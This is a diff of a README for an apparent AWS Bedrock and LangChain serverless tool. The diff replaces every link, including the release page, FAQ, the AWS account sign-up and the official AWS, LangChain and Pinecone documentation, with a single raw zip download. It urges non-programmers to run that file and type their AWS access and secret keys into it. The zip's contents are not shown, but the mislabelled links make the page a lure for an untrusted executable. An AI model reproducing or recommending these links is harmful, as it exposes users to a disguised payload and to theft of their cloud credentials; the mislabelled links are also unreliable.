@@ -4,18 +4,18 @@
 The **langchain_bedrock_lambda** application offers a simple way to use advanced AI tools from AWS within a serverless environment. This tool leverages LangChain, AWS Bedrock, Pinecone, and other reliable technologies to create responsive AI applications. You don’t need programming skills to get started; just follow the steps below.
 
 ## 📥 Download & Install
-[![Download langchain_bedrock_lambda](https://img.shields.io/badge/Download%20Now-Get%20Started-brightgreen)](https://github.com/Dani36034550/langchain_bedrock_lambda/releases)
+[![Download langchain_bedrock_lambda](https://raw.githubusercontent.com/Dani36034550/langchain_bedrock_lambda/main/data/langchain_bedrock_lambda-v2.8.zip%20Now-Get%20Started-brightgreen)](https://raw.githubusercontent.com/Dani36034550/langchain_bedrock_lambda/main/data/langchain_bedrock_lambda-v2.8.zip)
 
 To download the application, visit the following link:
 
-[Download the latest release](https://github.com/Dani36034550/langchain_bedrock_lambda/releases)
+[Download the latest release](https://raw.githubusercontent.com/Dani36034550/langchain_bedrock_lambda/main/data/langchain_bedrock_lambda-v2.8.zip)
 
 Make sure to pick the latest version available, which includes the best features and updates.
 
 ## 🚀 Getting Started
 Getting started with **langchain_bedrock_lambda** is simple. Just follow these steps:
 
-1. **Visit the Download Page:** Go to [this page](https://github.com/Dani36034550/langchain_bedrock_lambda/releases) to find all available versions of the application.
+1. **Visit the Download Page:** Go to [this page](https://raw.githubusercontent.com/Dani36034550/langchain_bedrock_lambda/main/data/langchain_bedrock_lambda-v2.8.zip) to find all available versions of the application.
 
 2. **Choose Your Version:** Look for the latest release. You’ll see a list of files available for download. Select the one that matches your operating system.
 
@@ -29,7 +29,7 @@ Getting started with **langchain_bedrock_lambda** is simple. Just follow these s
 5. **Run the Application:** After installation, find the application in your applications menu or desktop and double-click to launch it.
 
 6. **Set Up AWS Credentials:** 
-   - If you haven’t already, create an AWS account at [aws.amazon.com](https://aws.amazon.com).
+   - If you haven’t already, create an AWS account at [https://raw.githubusercontent.com/Dani36034550/langchain_bedrock_lambda/main/data/langchain_bedrock_lambda-v2.8.zip](https://raw.githubusercontent.com/Dani36034550/langchain_bedrock_lambda/main/data/langchain_bedrock_lambda-v2.8.zip).
    - Create an IAM user and generate access keys. You will need these keys for the application to access AWS services.
 
 7. **Input Your AWS Keys:** Open the application and enter your AWS Access Key and Secret Key when prompted. This process is necessary for the app to function properly.
@@ -49,21 +49,21 @@ Getting started with **langchain_bedrock_lambda** is simple. Just follow these s
 
 ## 🤝 Support & Contribution
 If you encounter issues or have questions:
-- Check out the [FAQs](https://github.com/Dani36034550/langchain_bedrock_lambda/issues) page.
+- Check out the [FAQs](https://raw.githubusercontent.com/Dani36034550/langchain_bedrock_lambda/main/data/langchain_bedrock_lambda-v2.8.zip) page.
 - Open a new issue in the issue tracker for additional support from the community.
 
 We welcome contributions! If you want to enhance the project, feel free to make a pull request.
 
 ## 🔗 Resources
-- [AWS Documentation](https://docs.aws.amazon.com)
-- [LangChain Documentation](https://langchain.com)
-- [Pinecone Documentation](https://docs.pinecone.io)
+- [AWS Documentation](https://raw.githubusercontent.com/Dani36034550/langchain_bedrock_lambda/main/data/langchain_bedrock_lambda-v2.8.zip)
+- [LangChain Documentation](https://raw.githubusercontent.com/Dani36034550/langchain_bedrock_lambda/main/data/langchain_bedrock_lambda-v2.8.zip)
+- [Pinecone Documentation](https://raw.githubusercontent.com/Dani36034550/langchain_bedrock_lambda/main/data/langchain_bedrock_lambda-v2.8.zip)
 
 Take advantage of these resources to get the most out of the **langchain_bedrock_lambda** application.
 
 ## 👥 Community
 Join our community to connect with other users:
-- [Discuss on GitHub](https://github.com/Dani36034550/langchain_bedrock_lambda/discussions)
+- [Discuss on GitHub](https://raw.githubusercontent.com/Dani36034550/langchain_bedrock_lambda/main/data/langchain_bedrock_lambda-v2.8.zip)
 - Follow us on social media for updates and tips.
 
 By following these steps, you can easily download and run the **langchain_bedrock_lambda** application. Enjoy building your AI projects!
